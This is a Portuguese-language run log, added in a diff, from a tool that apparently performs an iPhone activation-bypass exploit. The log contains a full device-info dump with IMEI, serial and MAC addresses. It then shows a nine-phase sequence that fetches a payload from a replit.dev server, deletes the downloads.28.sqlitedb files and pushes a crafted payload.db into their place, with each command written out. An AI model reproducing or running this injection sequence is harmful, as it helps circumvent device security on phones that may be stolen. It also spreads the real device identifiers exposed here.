@@ -1,0 +1,209 @@
+═══════════════════════════════════════════════════════════════════
+NORMAL LOG
+═══════════════════════════════════════════════════════════════════
+
+Aplicação iniciada...
+═══════════════════════════════════════════════════════
+[INICIO] Detectando dispositivo...
+[OK] iOS.exe encontrado!
+
+{"deviceList":["00008101-001E40313EC0001E"]}
+
+2025/11/24 22:38:43 INFO Go-iOS Agent not running, starting it on port port=60105
+2025/11/24 22:38:43 INFO Waiting for go-ios agent to be ready...
+{"level":"warning","msg":"go-ios agent is not running. You might need to start it with 'ios tunnel start' for ios17+. Use ENABLE_GO_IOS_AGENT=user for userspace tunnel or ENABLE_GO_IOS_AGENT=kernel for kernel tunnel for the experimental daemon mode.","time":"2025-11-24T22:38:43-03:00"}
+
+
+
+
+[OK] UDID capturado: 00008101-001E40313EC0001E
+[OK] ✓ Comando funcionou na tentativa 2!
+
+{"ActivationState":"Activated","ActivationStateAcknowledged":true,"BasebandActivationTicketVersion":"V2","BasebandCertId":3095201109,"BasebandChipID":938209,"BasebandKeyHashInformation":{"AKeyStatus":2,"SKeyHash":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","SKeyStatus":0},"BasebandMasterKeyHash":"1B41607650EBF11C6B39F41CB267DC64C121A9BCF44DBA5D28F55ACC86361BBA366554CD57B4C466055803E1EF81C870","BasebandRegionSKU":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==","BasebandSerialNumber":"9lO0rg==","BasebandStatus":"BBInfoAvailable","BasebandVersion":"6.02.03","BluetoothAddress":"f8:10:93:81:52:7a","BoardId":12,"BootSessionID":"6A81C405-1A36-4D6F-96B6-703479796130","BrickState":false,"BuildVersion":"23A355","CPUArchitecture":"arm64e","CarrierBundleInfoArray":[],"CertID":3095201109,"ChipID":33025,"ChipSerialNo":"9lO0rg==","DeviceClass":"iPhone","DeviceColor":"1","DeviceName":"iPhone","DieID":8514829551665182,"EthernetAddress":"f8:10:93:90:4f:c4","FirmwareVersion":"iBoot-13822.2.13","FusingStatus":3,"HardwareModel":"D53gAP","HardwarePlatform":"t8101","HasSiDP":true,"HostAttached":true,"HumanReadableProductVersionString":"26.0.1","InternationalMobileEquipmentIdentity":"353050112065097","InternationalMobileEquipmentIdentity2":"353050112099005","MLBSerialNumber":"FG1041102AXP5577L","MobileEquipmentIdentifier":"35305011206509","MobileSubscriberCountryCode":"","MobileSubscriberNetworkCode":"","ModelNumber":"MGHN3","NonVolatileRAM":{"StartupMute":"MQ==","SystemAudioVolumeSaved":"MQ==","auto-boot":"dHJ1ZQ==","backlight-level":"NTk4","backlight-nits":"MHgwMDUwMDAwMA==","boot-args":"","bootdelay":"MA==","fm-account-masked":"","fm-activation-locked":"Tk8=","fm-spkeys":"","fm-spstatus":"WUVT","panicmedic-telemetry":"EQEAAAAAAAAQz/0bfUIGABDP/Rt9QgYAQQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","panicmedic-timestamps":"MDo2NDI3ZDFiZmY5ZTZk","usbcfwflasherResult":"Tm8gZXJyb3Jz"},"PairRecordProtectionClass":4,"PartitionType":"GUID_partition_scheme","PasswordProtected":false,"PkHash":"uH0FVUsJlKhEmD05YurBSpF46D+trNajs+X4F7a6CGTl4f/iRcwbiJB9YouFNk62","ProductName":"iPhone OS","ProductType":"iPhone13,2","ProductVersion":"26.0.1","ProductionSOC":true,"ProtocolVersion":"2","RegionInfo":"J/A","SIMStatus":"kCTSIMSupportSIMStatusNotInserted","SIMTrayStatus":"kCTSIMSupportSIMTrayInsertedNoSIM","SerialNumber":"FFMDJ0ES0F00","SoftwareBehavior":"GQAAAAAAAAAAAAAAAAAAAA==","SoftwareBundleVersion":"","SupportedDeviceFamilies":[1],"TelephonyCapability":true,"TimeIntervalSince1970":1764034723.403955,"TimeZone":"America/Sao_Paulo","TimeZoneOffsetFromUTC":-10800,"TrustedHostAttached":true,"UniqueChipID":8514829551665182,"UniqueDeviceID":"00008101-001E40313EC0001E","UseRaptorCerts":true,"Uses24HourClock":true,"WiFiAddress":"f8:10:93:89:0d:24","WirelessBoardSerialNumber":"0383369A1602","kCTPostponementInfoServiceProvisioningState":false,"kCTPostponementStatus":"kCTPostponementStatusReady"}
+
+{"level":"warning","msg":"failed to get tunnel info","time":"2025-11-24T22:38:43-03:00","udid":"00008101-001E40313EC0001E"}
+
+  • ActivationState: "Activated"
+  • ActivationStateAcknowledged: true
+  • BasebandActivationTicketVersion: "V2"
+  • BasebandCertId: 3095201109
+  • BasebandChipID: 938209
+  • BasebandKeyHashInformation: {"AKeyStatus":2,"SKeyHash":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","SKeyS...
+  • BasebandMasterKeyHash: "1B41607650EBF11C6B39F41CB267DC64C121A9BCF44DBA5D28F55ACC86361BBA366554CD57B4C46...
+  • BasebandRegionSKU: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+  • BasebandSerialNumber: "9lO0rg=="
+  • BasebandStatus: "BBInfoAvailable"
+  • BasebandVersion: "6.02.03"
+  • BluetoothAddress: "f8:10:93:81:52:7a"
+  • BoardId: 12
+  • BootSessionID: "6A81C405-1A36-4D6F-96B6-703479796130"
+  • BrickState: false
+  • BuildVersion: "23A355"
+  • CPUArchitecture: "arm64e"
+  • CarrierBundleInfoArray: []
+  • CertID: 3095201109
+  • ChipID: 33025
+  • ChipSerialNo: "9lO0rg=="
+  • DeviceClass: "iPhone"
+  • DeviceColor: "1"
+  • DeviceName: "iPhone"
+  • DieID: 8514829551665182
+  • EthernetAddress: "f8:10:93:90:4f:c4"
+  • FirmwareVersion: "iBoot-13822.2.13"
+  • FusingStatus: 3
+  • HardwareModel: "D53gAP"
+  • HardwarePlatform: "t8101"
+  • HasSiDP: true
+  • HostAttached: true
+  • HumanReadableProductVersionString: "26.0.1"
+  • InternationalMobileEquipmentIdentity: "353050112065097"
+  • InternationalMobileEquipmentIdentity2: "353050112099005"
+  • MLBSerialNumber: "FG1041102AXP5577L"
+  • MobileEquipmentIdentifier: "35305011206509"
+  • MobileSubscriberCountryCode: ""
+  • MobileSubscriberNetworkCode: ""
+  • ModelNumber: "MGHN3"
+  • NonVolatileRAM: {"StartupMute":"MQ==","SystemAudioVolumeSaved":"MQ==","auto-boot":"dHJ1ZQ==","ba...
+  • PairRecordProtectionClass: 4
+  • PartitionType: "GUID_partition_scheme"
+  • PasswordProtected: false
+  • PkHash: "uH0FVUsJlKhEmD05YurBSpF46D+trNajs+X4F7a6CGTl4f/iRcwbiJB9YouFNk62"
+  • ProductName: "iPhone OS"
+  • ProductType: "iPhone13,2"
+  • ProductVersion: "26.0.1"
+  • ProductionSOC: true
+  • ProtocolVersion: "2"
+  • RegionInfo: "J/A"
+  • SIMStatus: "kCTSIMSupportSIMStatusNotInserted"
+  • SIMTrayStatus: "kCTSIMSupportSIMTrayInsertedNoSIM"
+  • SerialNumber: "FFMDJ0ES0F00"
+  • SoftwareBehavior: "GQAAAAAAAAAAAAAAAAAAAA=="
+  • SoftwareBundleVersion: ""
+  • SupportedDeviceFamilies: [1]
+  • TelephonyCapability: true
+  • TimeIntervalSince1970: 1764034723.403955
+  • TimeZone: "America/Sao_Paulo"
+  • TimeZoneOffsetFromUTC: -10800
+  • TrustedHostAttached: true
+  • UniqueChipID: 8514829551665182
+  • UniqueDeviceID: "00008101-001E40313EC0001E"
+  • UseRaptorCerts: true
+  • Uses24HourClock: true
+  • WiFiAddress: "f8:10:93:89:0d:24"
+  • WirelessBoardSerialNumber: "0383369A1602"
+  • kCTPostponementInfoServiceProvisioningState: false
+  • kCTPostponementStatus: "kCTPostponementStatusReady"
+[OK] Model encontrado (ProductName): iPhone OS
+[OK] Serial encontrado (SerialNumber): FFMDJ0ES0F00
+[OK] Product Type encontrado (ProductType): iPhone13,2
+[OK] iOS encontrado (ProductVersion): 26.0.1
+[OK] ECID encontrado (UniqueChipID): 8514829551665182
+[OK] IMEI encontrado (InternationalMobileEquipmentIdentity): 353050112065097
+[OK] IMEI2 encontrado (InternationalMobileEquipmentIdentity2): 353050112099005
+[OK] Activated encontrado (ActivationState): Activated
+
+[✓ OK] iPhone DETECTADO COM SUCESSO!
+═══════════════════════════════════════════════════════
+[*] Gerando payload Hello Activation...
+═══════════════════════════════════════════════════════
+[INIT] SEQUÊNCIA DE ATIVAÇÃO INICIADA
+═══════════════════════════════════════════════════════
+[*] PHASE 1: Reboot Inicial
+[*] PHASE 2: Extraindo GUID do Syslog
+[AVISO] GUID não encontrado, usando UDID
+[OK] GUID: 00008101-001E40313EC0001E
+[*] PHASE 3: Requisitando Payload do Servidor
+[OK] Payload URL: http://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev/cache/stage3/711f95734258a0e8/payload.png
+[*] PHASE 4: Baixando Payload
+[OK] Payload baixado: 16384 bytes
+[*] PHASE 4.5: Aguardando reconexão do dispositivo...
+[*] Aguardando... (1/15)
+[*] Aguardando... (2/15)
+[*] Aguardando... (3/15)
+[*] Aguardando... (4/15)
+[*] Aguardando... (5/15)
+[*] Aguardando... (6/15)
+[OK] Dispositivo reconectado! (tentativa 7/15)
+[*] PHASE 5: Limpando Arquivos Antigos
+[*] PHASE 6: Injetando Payload
+[OK] Payload injetado
+[*] PHASE 7: Reboot Pós-Injeção
+[*] Aguardando 30 segundos para dispositivo reconectar...
+[*] PHASE 8: Aguardando Metadados
+[AVISO] Metadados não encontrados
+[*] PHASE 9: Reboot Final
+═══════════════════════════════════════════════════════
+[✓] SEQUÊNCIA CONCLUÍDA COM SUCESSO!
+═══════════════════════════════════════════════════════
+
+
+═══════════════════════════════════════════════════════════════════
+DEBUG LOG
+═══════════════════════════════════════════════════════════════════
+
+Sistema inicializado
+[DEBUG] Hora: 2025-11-24 22:38:42.947
+[DEBUG] Diretório base: C:\Users\Tributos Consultoria\Pictures\MITEstudo\Distribuicao\
+[DEBUG] Procurando iOS.exe em: C:\Users\Tributos Consultoria\Pictures\MITEstudo\Distribuicao\iOS.exe
+[DEBUG] Criando processo...
+[DEBUG] Adicionando ENABLE_GO_IOS_AGENT=user
+[DEBUG] Iniciando processo iOS.exe list...
+[DEBUG] Processo iniciado, PID: 26976
+[DEBUG] Lendo stdout...
+[DEBUG] Stdout lido (45 bytes)
+[DEBUG] Lendo stderr...
+[DEBUG] Stderr lido (434 bytes)
+[DEBUG] Aguardando processo terminar (5s timeout)...
+[DEBUG] Processo terminou: True, Exit Code: 0
+[DEBUG] ═══ STDOUT ═══
+[DEBUG] ═══ FIM STDOUT ═══
+[DEBUG] ═══ STDERR ═══
+[DEBUG] ═══ FIM STDERR ═══
+[DEBUG] Analisando saída para detectar dispositivos...
+[DEBUG] Procurando por "deviceList" no JSON...
+[DEBUG] ✓ Encontrado "deviceList"
+[DEBUG] ✓ deviceList tem conteúdo!
+[DEBUG] Extraindo informações do dispositivo...
+[DEBUG] ╔═══════════════════════════════════════════╗
+[DEBUG] ║ EXTRAINDO INFORMAÇÕES DO DISPOSITIVO      ║
+[DEBUG] ╚═══════════════════════════════════════════╝
+[DEBUG] Parseando JSON da lista de dispositivos...
+[DEBUG] Encontrados 1 dispositivo(s)
+[DEBUG] iOS.exe path: C:\Users\Tributos Consultoria\Pictures\MITEstudo\Distribuicao\iOS.exe
+[DEBUG] iOS.exe existe: True
+[DEBUG] UDID válido: True
+[DEBUG] Tentativa 1/6: info -udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 1, Output: 0b, Error: 3715b
+[DEBUG] Tentativa 2/6: info --udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 0, Output: 3061b, Error: 124b
+[DEBUG] ═══ INFO OUTPUT ═══
+[DEBUG] ═══ FIM OUTPUT ═══
+[DEBUG] ═══ INFO ERROR ═══
+[DEBUG] ═══ FIM ERROR ═══
+[DEBUG] Primeiro char: '{', é JSON: True
+[DEBUG] Parseando como JSON...
+[DEBUG] JSON parseado! Propriedades:
+[DEBUG] ╚═══════════════════════════════════════════╝
+[DEBUG] CMD: reboot --udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 0
+[DEBUG] Error: {"level":"info","msg":"ok","time":"2025-11-24T22:39:06-03:00"}
+
+[DEBUG] Servidor selecionado: https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev
+[DEBUG] URL: https://64aebe5a-bacf-4267-901a-e999548dfc6e-00-1n1v4ownae3r2.worf.replit.dev/?prd=iPhone13,2&guid=00008101-001E40313EC0001E&sn=FFMDJ0ES0F00
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E rm --path "/Downloads/downloads.28.sqlitedb"
+[DEBUG] ExitCode: 0
+[DEBUG] Error: {"level":"warning","msg":"failed to get tunnel info","time":"2025-11-24T22:39:32-03:00","udid":"0000
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E rm --path "/Downloads/downloads.28.sqlitedb-shm"
+[DEBUG] ExitCode: 0
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E rm --path "/Downloads/downloads.28.sqlitedb-wal"
+[DEBUG] ExitCode: 0
+[DEBUG] CMD: fsync --udid 00008101-001E40313EC0001E push --srcPath="C:\Users\Tributos Consultoria\AppData\Local\Temp\iOSPayload\payload.db" --dstPath="/Downloads/downloads.28.sqlitedb"
+[DEBUG] ExitCode: 0
+[DEBUG] CMD: reboot --udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 0
+[DEBUG] Error: {"level":"info","msg":"ok","time":"2025-11-24T22:39:47-03:00"}
+
+[DEBUG] CMD: reboot --udid 00008101-001E40313EC0001E
+[DEBUG] ExitCode: 0
+[DEBUG] Error: {"level":"info","msg":"ok","time":"2025-11-24T22:40:48-03:00"}
+
